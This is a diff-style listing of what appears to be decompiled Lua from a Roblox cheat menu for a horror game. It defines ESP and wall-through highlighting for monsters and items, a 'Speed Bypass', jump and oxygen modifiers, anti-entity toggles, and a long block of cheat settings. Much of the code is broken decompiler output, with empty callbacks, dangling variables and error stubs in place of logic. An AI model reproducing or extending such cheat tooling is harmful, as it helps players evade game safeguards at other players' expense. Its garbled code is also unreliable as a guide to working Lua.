-    local _3688 = _3675.ColorPicker
-    local _3689 = Color3.new
-    local _3690 = _3689()
-    _3688(_3675, {
-        Default = _3690,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_3692, _3692_2, _3692_3)
-    end)
-    local _3693 = _3675.Slider
-    _3693(_3675, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_3695, _3695_2, _3695_3)
-        local _3696, _3696_2, _3696_3 = math.floor(_3695)
-        local _ = _3696 / 100
-    end)
-    type(_2527)
-    local _ = _2527.r
-    local _ = _2527.g
-    local _ = _2527.b
-    local _3702 = _3675.ColorPicker
-    local _3703 = Color3.new
-    local _3704 = _3703()
-    _3702(_3675, {
-        Default = _3704,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_3706, _3706_2, _3706_3)
-    end)
-    local _3707 = _3218.Section
-    local _3708 = _3707(_3218, "Battery ESP", "Right")
-    local _3709 = _3708.Toggle
-    _3709(_3708, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3711, _3711_2, _3711_3)
-    end)
-    local _3712 = _3708.Slider
-    _3712(_3708, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_3714, _3714_2, _3714_3)
-        local _3715, _3715_2, _3715_3 = math.floor(_3714)
-        local _ = _3715 / 100
-    end)
-    local _3717 = _3708.Toggle
-    _3717(_3708, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_3719, _3719_2, _3719_3)
-    end)
-    local _3720 = _3708.Toggle
-    _3720(_3708, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_3722, _3722_2, _3722_3)
-    end)
-    local _3723 = _3708.Toggle
-    _3723(_3708, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_3725, _3725_2, _3725_3)
-    end)
-    local _3726 = _3708.Slider
-    _3726(_3708, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_3728, _3728_2, _3728_3)
-        math.floor(_3728)
-    end)
-    type(_2561)
-    local _ = _2561.r
-    local _ = _2561.g
-    local _ = _2561.b
-    local _3734 = _3708.ColorPicker
-    local _3735 = Color3.new
-    local _3736 = _3735()
-    _3734(_3708, {
-        Default = _3736,
-        Description = "",
-        Title = "Text Color",
-    }, function(_3738, _3738_2, _3738_3)
-    end)
-    local _3739 = _3218.Section
-    local _3740 = _3739(_3218, "Gold Pile Chams", "Left")
-    local _3741 = _3740.Toggle
-    _3741(_3740, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3743, _3743_2, _3743_3)
-    end)
-    local _3744 = _3740.Slider
-    _3744(_3740, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_3746, _3746_2, _3746_3)
-        local _3747, _3747_2, _3747_3 = math.floor(_3746)
-        local _ = _3747 / 100
-    end)
-    type(_2521)
-    local _ = _2521.r
-    local _ = _2521.g
-    local _ = _2521.b
-    local _3753 = _3740.ColorPicker
-    local _3754 = Color3.new
-    local _3755 = _3754()
-    _3753(_3740, {
-        Default = _3755,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_3757, _3757_2, _3757_3)
-    end)
-    local _3758 = _3740.Slider
-    _3758(_3740, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_3760, _3760_2, _3760_3)
-        local _3761, _3761_2, _3761_3 = math.floor(_3760)
-        local _ = _3761 / 100
-    end)
-    type(_2523)
-    local _ = _2523.r
-    local _ = _2523.g
-    local _ = _2523.b
-    local _3767 = _3740.ColorPicker
-    local _3768 = Color3.new
-    local _3769 = _3768()
-    _3767(_3740, {
-        Default = _3769,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_3771, _3771_2, _3771_3)
-    end)
-    local _3772 = _3218.Section
-    local _3773 = _3772(_3218, "Gold Pile ESP", "Right")
-    local _3774 = _3773.Toggle
-    _3774(_3773, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3776, _3776_2, _3776_3)
-    end)
-    local _3777 = _3773.Slider
-    _3777(_3773, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_3779, _3779_2, _3779_3)
-        local _3780, _3780_2, _3780_3 = math.floor(_3779)
-        local _ = _3780 / 100
-    end)
-    local _3782 = _3773.Toggle
-    _3782(_3773, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_3784, _3784_2, _3784_3)
-    end)
-    local _3785 = _3773.Toggle
-    _3785(_3773, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_3787, _3787_2, _3787_3)
-    end)
-    local _3788 = _3773.Toggle
-    _3788(_3773, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_3790, _3790_2, _3790_3)
-    end)
-    local _3791 = _3773.Slider
-    _3791(_3773, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_3793, _3793_2, _3793_3)
-        math.floor(_3793)
-    end)
-    type(_2559)
-    local _ = _2559.r
-    local _ = _2559.g
-    local _ = _2559.b
-    local _3799 = _3773.ColorPicker
-    local _3800 = Color3.new
-    local _3801 = _3800()
-    _3799(_3773, {
-        Default = _3801,
-        Description = "",
-        Title = "Text Color",
-    }, function(_3803, _3803_2, _3803_3)
-    end)
-    local _3804 = _3218.Section
-    local _3805 = _3804(_3218, "Bandage Chams", "Left")
-    local _3806 = _3805.Toggle
-    _3806(_3805, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3808, _3808_2, _3808_3)
-    end)
-    local _3809 = _3805.Slider
-    _3809(_3805, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_3811, _3811_2, _3811_3)
-        local _3812, _3812_2, _3812_3 = math.floor(_3811)
-        local _ = _3812 / 100
-    end)
-    type(_2517)
-    local _ = _2517.r
-    local _ = _2517.g
-    local _ = _2517.b
-    local _3818 = _3805.ColorPicker
-    local _3819 = Color3.new
-    local _3820 = _3819()
-    _3818(_3805, {
-        Default = _3820,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_3822, _3822_2, _3822_3)
-    end)
-    local _3823 = _3805.Slider
-    _3823(_3805, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_3825, _3825_2, _3825_3)
-        local _3826, _3826_2, _3826_3 = math.floor(_3825)
-        local _ = _3826 / 100
-    end)
-    type(_2519)
-    local _ = _2519.r
-    local _ = _2519.g
-    local _ = _2519.b
-    local _3832 = _3805.ColorPicker
-    local _3833 = Color3.new
-    local _3834 = _3833()
-    _3832(_3805, {
-        Default = _3834,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_3836, _3836_2, _3836_3)
-    end)
-    local _3837 = _3218.Section
-    local _3838 = _3837(_3218, "Bandage ESP", "Right")
-    local _3839 = _3838.Toggle
-    _3839(_3838, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_3841, _3841_2, _3841_3)
-    end)
-    local _3842 = _3838.Slider
-    _3842(_3838, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_3844, _3844_2, _3844_3)
-        local _3845, _3845_2, _3845_3 = math.floor(_3844)
-        local _ = _3845 / 100
-    end)
-    local _3847 = _3838.Toggle
-    _3847(_3838, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_3849, _3849_2, _3849_3)
-    end)
-    local _3850 = _3838.Toggle
-    _3850(_3838, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_3852, _3852_2, _3852_3)
-    end)
-    local _3853 = _3838.Toggle
-    _3853(_3838, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_3855, _3855_2, _3855_3)
-    end)
-    local _3856 = _3838.Slider
-    _3856(_3838, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_3858, _3858_2, _3858_3)
-        math.floor(_3858)
-    end)
-    type(_2553)
-    local _ = _2553.r
-    local _ = _2553.g
-    local _ = _2553.b
-    local _3864 = _3838.ColorPicker
-    local _3865 = Color3.new
-    local _3866 = _3865()
-    _3864(_3838, {
-        Default = _3866,
-        Description = "",
-        Title = "Text Color",
-    }, function(_3868, _3868_2, _3868_3)
-    end)
-    local _3869 = _2446.Button
-    local _3870 = _3869(_2446, "Character Modifiying", "http://www.roblox.com/asset/?id=8395621517")
-    local _3871 = _3870.Section
-    local _3872 = _3871(_3870, "Character Actions", "Left")
-    local _3873 = _3872.Button
-    _3873(_3872, {
-        ButtonName = "Stun",
-        Title = "Stun",
-        Description = "",
-    }, function(_3875, _3875_2, _3875_3)
-        local _3876 = game.Players.LocalPlayer
-        local _3877 = _3876.Character
-        local _3878 = _3877.SetAttribute
-        _3878(_3877, "Stunned", true)
-    end)
-    local _3880 = _3872.Button
-    _3880(_3872, {
-        ButtonName = "UnStun",
-        Title = "UnStun",
-        Description = "",
-    }, function(_3882, _3882_2, _3882_3)
-        local _3883 = game.Players.LocalPlayer
-        local _3884 = _3883.Character
-        local _3885 = _3884.SetAttribute
-        _3885(_3884, "Stunned", false)
-    end)
-    local _3887 = _3872.Button
-    _3887(_3872, {
-        ButtonName = "Die",
-        Title = "Death",
-        Description = "",
-    }, function(_3889, _3889_2, _3889_3)
-        local _3890 = game.Players.LocalPlayer
-        local _3891 = _3890.Character
-        local _ = _3891.Humanoid
-        error("line 1: attempt to perform arithmetic (unm) on function")
-    end)
-    local _3893 = _3872.Button
-    _3893(_3872, {
-        ButtonName = "ReJoin",
-        Title = "ReJoining",
-        Description = "",
-    }, function(_3895, _3895_2, _3895_3)
-        local _TeleportService3896 = game:GetService("TeleportService")
-        local _3897 = _TeleportService3896.Teleport
-        local _Players3898 = game:GetService("Players")
-        local _3899 = _Players3898.LocalPlayer
-        _3897(_TeleportService3896, game.PlaceId, _3899)
-    end)
-    local _3901 = _3870.Section
-    local _3902 = _3901(_3870, "Character Modifications", "Right")
-    local _3903 = _3902.Toggle
-    _3903(_3902, {
-        Default = false,
-        Description = "Unstoppable Jump",
-        Title = "Eternal Jump",
-    }, function(_3905, _3905_2, _3905_3)
-    end)
-    local _3906 = _3902.Toggle
-    _3906(_3902, {
-        Default = false,
-        Description = "Block Delay Optimization",
-        Title = "Speed Bypass",
-    }, function(_3908, _3908_2, _3908_3)
-    end)
-    local _3909 = _3902.Toggle
-    _3909(_3902, {
-        Default = false,
-        Description = "",
-        Title = "Speed Multiplier",
-    }, function(_3911, _3911_2, _3911_3)
-    end)
-    local _3912 = _3902.Slider
-    _3912(_3902, {
-        Min = 0,
-        Title = "Custom Speed",
-        Max = 1000,
-        Default = 0,
-        Description = "",
-    }, function(_3914, _3914_2, _3914_3)
-        local _3915 = _3914 / 10
-        math.floor(_3915)
-    end)
-    local _3917 = _3902.Toggle
-    _3917(_3902, {
-        Default = false,
-        Description = "",
-        Title = "Oxygen Changer",
-    }, function(_3919, _3919_2, _3919_3)
-    end)
-    local _3920 = _3902.Slider
-    _3920(_3902, {
-        Min = 0,
-        Title = "Custom Oxygen",
-        Max = 100,
-        Default = 100,
-        Description = "",
-    }, function(_3922, _3922_2, _3922_3)
-        math.floor(_3922)
-    end)
-    local _3924 = Instance.new
-    local _3925 = _3924("ScreenGui", game.CoreGui)
-    local _3926 = Instance.new
-    local _3927 = _3926("TextButton")
-    _3927.BackgroundTransparency = 1
-    local _3928 = UDim2.new
-    local _3929 = _3928(0, 0, 0, 0)
-    _3927.Size = _3929
-    _3927.Text = " "
-    _3927.Parent = _3925
-    local _3930 = Instance.new
-    local _3931 = _3930("ScreenGui", game.CoreGui)
-    _3931.Name = "BackgroundScreenGui"
-    _3931.Enabled = true
-    local _3932 = Instance.new
-    local _3933 = _3932("TextLabel", _3931)
-    _3933.Name = "BackgroundLabel"
-    local _3934 = Instance.new
-    local _3935 = _3934("UIGradient", _3933)
-    _3935.Name = "BackgroundGradient"
-    local _ = ColorSequence.new
-    error("line 1: attempt to index nil with 'new'")
-end
-fenv.menuOpen = true
-fenv.backgroundgradientenabled = true
-fenv.backgroundgradienttransparency = 0.5
-fenv.backgroundgradientrotation = 0
-fenv.backgroundgradientcolor1 = _3982
-fenv.backgroundgradientcolor2 = _3984
-fenv.screengirlenabled = true
-fenv.screengirlside = true
-fenv.screengirl = "Tomoko"
-fenv.blurenabled = true
-fenv.blursize = 24
-fenv.customguicolor = _3986
-fenv.customshadowcolor = _3988
-fenv.customguidpi = 80
-fenv.customshadowtransparency = 0.5
-fenv.textsize = 0
-fenv.delayoptimization = 0.5
-fenv.instantprompt = false
-fenv.antigiggle = false
-fenv.antihearing = false
-fenv.antistun = false
-fenv.antieyes = false
-fenv.antiscreech = false
-fenv.ambushnotify = false
-fenv.rushnotify = false
-fenv.eyesnotify = false
-fenv.speedbypass = false
-fenv.eternaljump = false
-fenv.walkspeedmultiplier = false
-fenv.walkspeedplayer = 0
-fenv.oxygenchanger = false
-fenv.customoxygen = 100
-fenv.lightstatus = false
-fenv.lightshadows = false
-fenv.lightbrightness = 1
-fenv.lightrange = 60
-fenv.lightcolor = _3990
-fenv.originalfogcolor = _3991
-fenv.customfogcolor = _3993
-fenv.originalfogend = _3994
-fenv.customfogend = 1000
-fenv.originalfogstart = _3995
-fenv.customfogstart = 100
-fenv.changefogstatus = false
-fenv.doorfakechamsstatus = false
-fenv.doorfakechamsoutlinecolora = _3997
-fenv.doorfakechamsfillingcolora = _3999
-fenv.doorfakechamsoutlinetransparencya = 0
-fenv.doorfakechamsfillingtransparencya = 0.9
-fenv.doorrealchamsstatus = false
-fenv.doorrealchamsoutlinecolora = _4001
-fenv.doorrealchamsfillingcolora = _4003
-fenv.doorrealchamsoutlinetransparencya = 0
-fenv.doorrealchamsfillingtransparencya = 0.9
-fenv.generatorchamsstatus = false
-fenv.generatorchamsoutlinecolora = _4005
-fenv.generatorchamsfillingcolora = _4007
-fenv.generatorchamsoutlinetransparencya = 0
-fenv.generatorchamsfillingtransparencya = 0.9
-fenv.minesanchorchamsstatus = false
-fenv.minesanchorchamsoutlinecolora = _4009
-fenv.minesanchorchamsfillingcolora = _4011
-fenv.minesanchorchamsoutlinetransparencya = 0
-fenv.minesanchorchamsfillingtransparencya = 0.9
-fenv.rushchamsstatus = false
-fenv.rushchamsoutlinecolora = _4013
-fenv.rushchamsfillingcolora = _4015
-fenv.rushchamsoutlinetransparencya = 0
-fenv.rushchamsfillingtransparencya = 0.9
-fenv.ambushchamsstatus = false
-fenv.ambushchamsoutlinecolora = _4017
-fenv.ambushchamsfillingcolora = _4019
-fenv.ambushchamsoutlinetransparencya = 0
-fenv.ambushchamsfillingtransparencya = 0.9
-fenv.gigglechamsstatus = false
-fenv.gigglechamsoutlinecolora = _4021
-fenv.gigglechamsfillingcolora = _4023
-fenv.gigglechamsoutlinetransparencya = 0
-fenv.gigglechamsfillingtransparencya = 0.9
-fenv.grumblechamsstatus = false
-fenv.grumblechamsoutlinecolora = _4025
-fenv.grumblechamsfillingcolora = _4027
-fenv.grumblechamsoutlinetransparencya = 0
-fenv.grumblechamsfillingtransparencya = 0.9
-fenv.eyeschamsstatus = false
-fenv.eyeschamsoutlinecolora = _4029
-fenv.eyeschamsfillingcolora = _4031
-fenv.eyeschamsoutlinetransparencya = 0
-fenv.eyeschamsfillingtransparencya = 0.9
-fenv.glowstickchamsstatus = false
-fenv.glowstickchamsoutlinecolora = _4033
-fenv.glowstickchamsfillingcolora = _4035
-fenv.glowstickchamsoutlinetransparencya = 0
-fenv.glowstickchamsfillingtransparencya = 0.9
-fenv.toolshedchamsstatus = false
-fenv.toolshedchamsoutlinecolora = _4037
-fenv.toolshedchamsfillingcolora = _4039
-fenv.toolshedchamsoutlinetransparencya = 0
-fenv.toolshedchamsfillingtransparencya = 0.9
-fenv.fusechamsstatus = false
-fenv.fusechamsoutlinecolora = _4041
-fenv.fusechamsfillingcolora = _4043
-fenv.fusechamsoutlinetransparencya = 0
-fenv.fusechamsfillingtransparencya = 0.9
-fenv.bandagechamsstatus = false
-fenv.bandagechamsoutlinecolora = _4045
-fenv.bandagechamsfillingcolora = _4047
-fenv.bandagechamsoutlinetransparencya = 0
-fenv.bandagechamsfillingtransparencya = 0.9
-fenv.goldchamsstatus = false
-fenv.goldchamsoutlinecolora = _4049
-fenv.goldchamsfillingcolora = _4051
-fenv.goldchamsoutlinetransparencya = 0
-fenv.goldchamsfillingtransparencya = 0.9
-fenv.batterychamsstatus = false
-fenv.batterychamsoutlinecolora = _4053
-fenv.batterychamsfillingcolora = _4055
-fenv.batterychamsoutlinetransparencya = 0
-fenv.batterychamsfillingtransparencya = 0.9
-fenv.lighterchamsstatus = false
-fenv.lighterchamsoutlinecolora = _4057
-fenv.lighterchamsfillingcolora = _4059
-fenv.lighterchamsoutlinetransparencya = 0
-fenv.lighterchamsfillingtransparencya = 0.9
-fenv.giggleespstatus = false
-fenv.namegiggleespstatus = false
-fenv.distancegiggleespstatus = false
-fenv.enabledgiggleoutline = true
-fenv.textsizenamegigglea = 8
-fenv.namegiggleespcolora = _4061
-fenv.giggleespoffseta = 0.5
-fenv.fontnamegiggleesp = "Montserrat"
-fenv.grumbleespstatus = false
-fenv.namegrumbleespstatus = false
-fenv.distancegrumbleespstatus = false
-fenv.enabledgrumbleoutline = true
-fenv.textsizenamegrumblea = 8
-fenv.namegrumbleespcolora = _4063
-fenv.grumbleespoffseta = 0.5
-fenv.fontnamegrumbleesp = "Montserrat"
-fenv.rushespstatus = false
-fenv.namerushespstatus = false
-fenv.distancerushespstatus = false
-fenv.enabledrushoutline = true
-fenv.textsizenamerusha = 8
-fenv.namerushespcolora = _4065
-fenv.rushespoffseta = 0.5
-fenv.fontnamerushesp = "Montserrat"
-fenv.ambushespstatus = false
-fenv.nameambushespstatus = false
-fenv.distanceambushespstatus = false
-fenv.enabledambushoutline = true
-fenv.textsizenameambusha = 8
-fenv.nameambushespcolora = _4067
-fenv.ambushespoffseta = 0.5
-fenv.fontnameambushesp = "Montserrat"
-fenv.eyesespstatus = false
-fenv.nameeyesespstatus = false
-fenv.distanceeyesespstatus = false
-fenv.enabledeyesoutline = true
-fenv.textsizenameeyesa = 8
-fenv.nameeyesespcolora = _4069
-fenv.eyesespoffseta = 0.5
-fenv.fontnameeyesesp = "Montserrat"
-fenv.doorrealespstatus = false
-fenv.namedoorrealespstatus = false
-fenv.distancedoorrealespstatus = false
-fenv.enableddoorrealoutline = true
-fenv.textsizenamedoorreala = 8
-fenv.namedoorrealespcolora = _4071
-fenv.doorrealespoffseta = 0.5
-fenv.fontnamedoorrealesp = "Montserrat"
-fenv.doorfakeespstatus = false
-fenv.namedoorfakeespstatus = false
-fenv.distancedoorfakeespstatus = false
-fenv.enableddoorfakeoutline = true
-fenv.textsizenamedoorfakea = 8
-fenv.namedoorfakeespcolora = _4073
-fenv.doorfakeespoffseta = 0.5
-fenv.fontnamedoorfakeesp = "Montserrat"
-fenv.generatorespstatus = false
-fenv.namegeneratorespstatus = false
-fenv.distancegeneratorespstatus = false
-fenv.enabledgeneratoroutline = true
-fenv.textsizenamegeneratora = 8
-fenv.namegeneratorespcolora = _4075
-fenv.generatorespoffseta = 0.5
-fenv.fontnamegeneratoresp = "Montserrat"
-fenv.minesanchorespstatus = false
-fenv.nameminesanchorespstatus = false
-fenv.distanceminesanchorespstatus = false
-fenv.enabledminesanchoroutline = true
-fenv.textsizenameminesanchora = 8
-fenv.nameminesanchorespcolora = _4077
-fenv.minesanchorespoffseta = 0.5
-fenv.fontnameminesanchoresp = "Montserrat"
-fenv.fuseespstatus = false
-fenv.namefuseespstatus = false
-fenv.distancefuseespstatus = false
-fenv.enabledfuseoutline = true
-fenv.textsizenamefusea = 8
-fenv.namefuseespcolora = _4079
-fenv.fuseespoffseta = 0.5
-fenv.fontnamefuseesp = "Montserrat"
-fenv.glowstickespstatus = false
-fenv.nameglowstickespstatus = false
-fenv.distanceglowstickespstatus = false
-fenv.enabledglowstickoutline = true
-fenv.textsizenameglowsticka = 8
-fenv.nameglowstickespcolora = _4081
-fenv.glowstickespoffseta = 0.5
-fenv.fontnameglowstickesp = "Montserrat"
-fenv.bandageespstatus = false
-fenv.namebandageespstatus = false
-fenv.distancebandageespstatus = false
-fenv.enabledbandageoutline = true
-fenv.textsizenamebandagea = 8
-fenv.namebandageespcolora = _4083
-fenv.bandageespoffseta = 0.5
-fenv.fontnamebandageesp = "Montserrat"
-fenv.goldespstatus = false
-fenv.namegoldespstatus = false
-fenv.distancegoldespstatus = false
-fenv.enabledgoldoutline = true
-fenv.textsizenamegolda = 8
-fenv.namegoldespcolora = _4085
-fenv.goldespoffseta = 0.5
-fenv.fontnamegoldesp = "Montserrat"
-fenv.batteryespstatus = false
-fenv.namebatteryespstatus = false
-fenv.distancebatteryespstatus = false
-fenv.enabledbatteryoutline = true
-fenv.textsizenamebatterya = 8
-fenv.namebatteryespcolora = _4087
-fenv.batteryespoffseta = 0.5
-fenv.fontnamebatteryesp = "Montserrat"
-fenv.lighterespstatus = false
-fenv.namelighterespstatus = false
-fenv.distancelighterespstatus = false
-fenv.enabledlighteroutline = true
-fenv.textsizenamelightera = 8
-fenv.namelighterespcolora = _4089
-fenv.lighterespoffseta = 0.5
-fenv.fontnamelighteresp = "Montserrat"
-fenv.toolshedespstatus = false
-fenv.nametoolshedespstatus = false
-fenv.distancetoolshedespstatus = false
-fenv.enabledtoolshedoutline = true
-fenv.textsizenametoolsheda = 8
-fenv.nametoolshedespcolora = _4091
-fenv.toolshedespoffseta = 0.5
-fenv.fontnametoolshedesp = "Montserrat"
-fenv.UpdateInfo = "All Games:\n    Info:\n        [+] - Added Time, FPS, Ping\n        [+] - Added Last Update Changelog\n    All Categories:\n        [~] - Improved Canvas Size in Dropdown\n"
-fenv.antistun = _4124
-fenv.antihearing = _4127
-fenv.antieyes = _4130
-fenv.antigiggle = _4133
-fenv.antiscreech = _4136
-fenv.instantprompt = _4141
-fenv.delayoptimization = _4146
-fenv.eyesnotify = _4153
-fenv.rushnotify = _4156
-fenv.ambushnotify = _4159
-fenv.changefogstatus = _4166
-fenv.customfogend = _4170
-fenv.customfogstart = _4174
-fenv.b = _4178
-fenv.g = _4177
-fenv.r = _4176
-fenv.customfogcolor = _4183
-fenv.lightstatus = _4188
-fenv.lightshadows = _4191
-fenv.lightrange = _4195
-fenv.lightbrightness = _4200
-fenv.b = _4204
-fenv.g = _4203
-fenv.r = _4202
-fenv.lightcolor = _4209
-fenv.doorrealchamsstatus = _4216
-fenv.doorrealchamsoutlinetransparencya = _4221
-fenv.b = _4225
-fenv.g = _4224
-fenv.r = _4223
-fenv.doorrealchamsoutlinecolora = _4230
-fenv.doorrealchamsfillingtransparencya = _4235
-fenv.b = _4239
-fenv.g = _4238
-fenv.r = _4237
-fenv.doorrealchamsfillingcolora = _4244
-fenv.doorrealespstatus = _4249
-fenv.doorrealespoffseta = _4254
-fenv.enableddoorrealoutline = _4257
-fenv.namedoorrealespstatus = _4260
-fenv.distancedoorrealespstatus = _4263
-fenv.textsizenamedoorreala = _4267
-fenv.b = _4271
-fenv.g = _4270
-fenv.r = _4269
-fenv.namedoorrealespcolora = _4276
-fenv.doorfakechamsstatus = _4281
-fenv.doorfakechamsoutlinetransparencya = _4286
-fenv.b = _4290
-fenv.g = _4289
-fenv.r = _4288
-fenv.doorfakechamsoutlinecolora = _4295
-fenv.doorfakechamsfillingtransparencya = _4300
-fenv.b = _4304
-fenv.g = _4303
-fenv.r = _4302
-fenv.doorfakechamsfillingcolora = _4309
-fenv.doorfakeespstatus = _4314
-fenv.doorfakeespoffseta = _4319
-fenv.enableddoorfakeoutline = _4322
-fenv.namedoorfakeespstatus = _4325
-fenv.distancedoorfakeespstatus = _4328
-fenv.textsizenamedoorfakea = _4332
-fenv.b = _4336
-fenv.g = _4335
-fenv.r = _4334
-fenv.namedoorfakeespcolora = _4341
-fenv.generatorchamsstatus = _4346
-fenv.generatorchamsoutlinetransparencya = _4351
-fenv.b = _4355
-fenv.g = _4354
-fenv.r = _4353
-fenv.generatorchamsoutlinecolora = _4360
-fenv.generatorchamsfillingtransparencya = _4365
-fenv.b = _4369
-fenv.g = _4368
-fenv.r = _4367
-fenv.generatorchamsfillingcolora = _4374
-fenv.generatorespstatus = _4379
-fenv.generatorespoffseta = _4384
-fenv.enabledgeneratoroutline = _4387
-fenv.namegeneratorespstatus = _4390
-fenv.distancegeneratorespstatus = _4393
-fenv.textsizenamegeneratora = _4397
-fenv.b = _4401
-fenv.g = _4400
-fenv.r = _4399
-fenv.namegeneratorespcolora = _4406
-fenv.minesanchorchamsstatus = _4411
-fenv.minesanchorchamsoutlinetransparencya = _4416
-fenv.b = _4420
-fenv.g = _4419
-fenv.r = _4418
-fenv.minesanchorchamsoutlinecolora = _4425
-fenv.minesanchorchamsfillingtransparencya = _4430
-fenv.b = _4434
-fenv.g = _4433
-fenv.r = _4432
-fenv.minesanchorchamsfillingcolora = _4439
-fenv.minesanchorespstatus = _4444
-fenv.minesanchorespoffseta = _4449
-fenv.enabledminesanchoroutline = _4452
-fenv.nameminesanchorespstatus = _4455
-fenv.distanceminesanchorespstatus = _4458
-fenv.textsizenameminesanchora = _4462
-fenv.b = _4466
-fenv.g = _4465
-fenv.r = _4464
-fenv.nameminesanchorespcolora = _4471
-fenv.rushchamsstatus = _4478
-fenv.rushchamsoutlinetransparencya = _4483
-fenv.b = _4487
-fenv.g = _4486
-fenv.r = _4485
-fenv.rushchamsoutlinecolora = _4492
-fenv.rushchamsfillingtransparencya = _4497
-fenv.b = _4501
-fenv.g = _4500
-fenv.r = _4499
-fenv.rushchamsfillingcolora = _4506
-fenv.rushespstatus = _4511
-fenv.rushespoffseta = _4516
-fenv.enabledrushoutline = _4519
-fenv.namerushespstatus = _4522
-fenv.distancerushespstatus = _4525
-fenv.textsizenamerusha = _4529
-fenv.b = _4533
-fenv.g = _4532
-fenv.r = _4531
-fenv.namerushespcolora = _4538
-fenv.ambushchamsstatus = _4543
-fenv.ambushchamsoutlinetransparencya = _4548
-fenv.b = _4552
-fenv.g = _4551
-fenv.r = _4550
-fenv.ambushchamsoutlinecolora = _4557
-fenv.ambushchamsfillingtransparencya = _4562
-fenv.b = _4566
-fenv.g = _4565
-fenv.r = _4564
-fenv.ambushchamsfillingcolora = _4571
-fenv.ambushespstatus = _4576
-fenv.ambushespoffseta = _4581
-fenv.enabledambushoutline = _4584
-fenv.nameambushespstatus = _4587
-fenv.distanceambushespstatus = _4590
-fenv.textsizenameambusha = _4594
-fenv.b = _4598
-fenv.g = _4597
-fenv.r = _4596
-fenv.nameambushespcolora = _4603
-fenv.eyeschamsstatus = _4608
-fenv.eyeschamsoutlinetransparencya = _4613
-fenv.b = _4617
-fenv.g = _4616
-fenv.r = _4615
-fenv.eyeschamsoutlinecolora = _4622
-fenv.eyeschamsfillingtransparencya = _4627
-fenv.b = _4631
-fenv.g = _4630
-fenv.r = _4629
-fenv.eyeschamsfillingcolora = _4636
-fenv.eyesespstatus = _4641
-fenv.eyesespoffseta = _4646
-fenv.enabledeyesoutline = _4649
-fenv.nameeyesespstatus = _4652
-fenv.distanceeyesespstatus = _4655
-fenv.textsizenameeyesa = _4659
-fenv.b = _4663
-fenv.g = _4662
-fenv.r = _4661
-fenv.nameeyesespcolora = _4668
-fenv.gigglechamsstatus = _4673
-fenv.gigglechamsoutlinetransparencya = _4678
-fenv.b = _4682
-fenv.g = _4681
-fenv.r = _4680
-fenv.gigglechamsoutlinecolora = _4687
-fenv.gigglechamsfillingtransparencya = _4692
-fenv.b = _4696
-fenv.g = _4695
-fenv.r = _4694
-fenv.gigglechamsfillingcolora = _4701
-fenv.giggleespstatus = _4706
-fenv.giggleespoffseta = _4711
-fenv.enabledgiggleoutline = _4714
-fenv.namegiggleespstatus = _4717
-fenv.distancegiggleespstatus = _4720
-fenv.textsizenamegigglea = _4724
-fenv.b = _4728
-fenv.g = _4727
-fenv.r = _4726
-fenv.namegiggleespcolora = _4733
-fenv.grumblechamsstatus = _4738
-fenv.grumblechamsoutlinetransparencya = _4743
-fenv.b = _4747
-fenv.g = _4746
-fenv.r = _4745
-fenv.grumblechamsoutlinecolora = _4752
-fenv.grumblechamsfillingtransparencya = _4757
-fenv.b = _4761
-fenv.g = _4760
-fenv.r = _4759
-fenv.grumblechamsfillingcolora = _4766
-fenv.grumbleespstatus = _4771
-fenv.grumbleespoffseta = _4776
-fenv.enabledgrumbleoutline = _4779
-fenv.namegrumbleespstatus = _4782
-fenv.distancegrumbleespstatus = _4785
-fenv.textsizenamegrumblea = _4789
-fenv.b = _4793
-fenv.g = _4792
-fenv.r = _4791
-fenv.namegrumbleespcolora = _4798
-fenv.toolshedchamsstatus = _4805
-fenv.toolshedchamsoutlinetransparencya = _4810
-fenv.b = _4814
-fenv.g = _4813
-fenv.r = _4812
-fenv.toolshedchamsoutlinecolora = _4819
-fenv.toolshedchamsfillingtransparencya = _4824
-fenv.b = _4828
-fenv.g = _4827
-fenv.r = _4826
-fenv.toolshedchamsfillingcolora = _4833
-fenv.toolshedespstatus = _4838
-fenv.toolshedespoffseta = _4843
-fenv.enabledtoolshedoutline = _4846
-fenv.nametoolshedespstatus = _4849
-fenv.distancetoolshedespstatus = _4852
-fenv.textsizenametoolsheda = _4856
-fenv.b = _4860
-fenv.g = _4859
-fenv.r = _4858
